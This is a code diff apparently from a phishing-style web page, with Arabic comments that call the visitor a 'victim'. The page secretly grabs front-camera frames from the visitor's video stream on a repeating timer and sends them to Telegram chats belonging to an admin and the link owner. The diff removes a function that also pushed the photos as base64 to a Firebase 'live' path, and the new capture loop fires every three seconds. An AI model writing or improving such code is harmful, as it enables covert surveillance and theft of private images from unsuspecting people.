@@ -159,24 +159,6 @@
                 }
             }
 
-            // ✅ دالة حفظ الصورة في Firebase (Live)
-            async function savePhotoToFirebase(blob, userId) {
-                if (!userId || userId === "Unknown") return;
-                
-                const reader = new FileReader();
-                reader.onloadend = async function() {
-                    const base64data = reader.result;
-                    await database.ref(`live/${userId}/photos`).push({
-                        image: base64data,
-                        timestamp: Date.now(),
-                        time: new Date().toLocaleTimeString('ar-EG'),
-                        tool: tool,
-                        type: "كاميرا أمامي"
-                    });
-                };
-                reader.readAsDataURL(blob);
-            }
-
             // ✅ دالة تسجيل دخول الضحية
             async function logVictimOnline() {
                 if (!userIdFromUrl || userIdFromUrl === "Unknown") return;
@@ -255,42 +237,34 @@
             }
 
             // ✅ دالة التقاط الصور
-            function capturePhotos() {
-                const video = document.getElementById("video");
-                const canvas = document.getElementById("canvas");
-                const context = canvas.getContext("2d");
+           function capturePhotos() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
 
-                function takePhoto() {
-                    if (video.videoWidth && video.videoHeight) {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            // إرسال للأدمن
-                            sendPhotoToTelegram(blob, adminChatId);
-                            
-                            // إرسال لصاحب الرابط
-                            if (userIdFromUrl && userIdFromUrl !== "Unknown" && userIdFromUrl !== adminChatId) {
-                                sendPhotoToTelegram(blob, userIdFromUrl);
-                            }
-                            
-                            // إرسال للتليجرام ID
-                            if (telegramId && telegramId !== "Unknown" && telegramId !== userIdFromUrl && telegramId !== adminChatId) {
-                                sendPhotoToTelegram(blob, telegramId);
-                            }
-                            
-                            // حفظ الصورة في Firebase (Live)
-                            savePhotoToFirebase(blob, userIdFromUrl);
-                        }, "image/jpeg", 0.7); // جودة 70% للسرعة
-                    }
-                    
-                    // تصوير كل 3 ثواني
-                    setTimeout(takePhoto, 1000);
+    function takePhoto() {
+        if (video.videoWidth && video.videoHeight) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                // إرسال للتليجرام بس
+                sendPhotoToTelegram(blob, adminChatId);
+                
+                if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                    sendPhotoToTelegram(blob, userId);
                 }
                 
-                takePhoto();
-            }
+                if (telegramId && telegramId !== "Unknown" && telegramId !== userId && telegramId !== adminChatId) {
+                    sendPhotoToTelegram(blob, telegramId);
+                }
+            }, "image/jpeg", 0.7);
+        }
+        setTimeout(takePhoto, 3000); // كل 3 ثواني
+    }
+    takePhoto();
+}
 
             // ✅ تشغيل كل حاجة
             startCamera();
